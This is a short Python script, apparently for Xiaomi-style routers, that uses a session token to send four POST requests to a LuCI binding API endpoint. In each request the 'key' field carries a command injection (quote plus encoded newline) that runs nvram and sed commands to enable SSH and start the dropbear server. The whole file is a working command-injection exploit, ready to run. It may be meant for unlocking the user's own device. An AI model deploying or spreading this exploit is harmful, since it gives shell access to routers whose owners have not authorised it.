import http.client
import re

def get_token():
    token = input("请输入token: ")
    while len(token) != 32 or not re.match(r'^[a-fA-F0-9]+$', token):
        print("错误：token 的长度必须为 32 个字符请重新输入。")
        token = input("请输入token: ")
    return token

def send_request(url, path, data):
    conn = http.client.HTTPConnection(url)
    try:
        conn.request("POST", path, body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        response = conn.getresponse()
        return response.read().decode()
    except Exception as e:
        print(f"请求失败: {e}")
        return None
    finally:
        conn.close()  # 确保连接在使用后关闭

def main():
    token = get_token()
    data_list = [
        "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'",
        "uid=1234&key=1234'%0Anvram%20commit'",
        "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'",
        "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'"
    ]

    url = '192.168.31.1'
    path = f'/cgi-bin/luci/;stok={token}/api/xqsystem/start_binding'

    success_count = 0

    for data in data_list:
        response_body = send_request(url, path, data)
        if response_body:
            print("Response Body:", response_body)
            if "hw" in response_body:
                success_count += 1
            else:
                print("失败")
        print("-" * 40)

    if success_count == len(data_list):
        print("ssh端口开启成功")

if __name__ == "__main__":
    main()
